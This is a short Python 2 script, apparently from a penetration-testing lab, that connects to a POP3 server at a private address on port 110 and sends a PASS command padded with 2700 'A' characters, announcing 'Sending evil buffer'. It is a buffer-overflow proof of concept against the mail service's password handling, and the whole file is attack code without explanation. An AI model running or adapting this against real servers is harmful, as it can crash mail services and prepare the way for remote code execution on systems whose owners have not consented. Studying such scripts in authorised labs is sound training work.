#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = 'A' * 2700

try:
    print "\nSending evil buffer..."
    s.connect(('10.11.23.123', 110))
    data = s.recv(1024)
    s.send('User username' + '\r\n')
    data=s.recv(1024)
    s.send('PASS '+buffer+ '\r\n')
    print "\Done!."
except:
    print "Could not connect to POP3!"
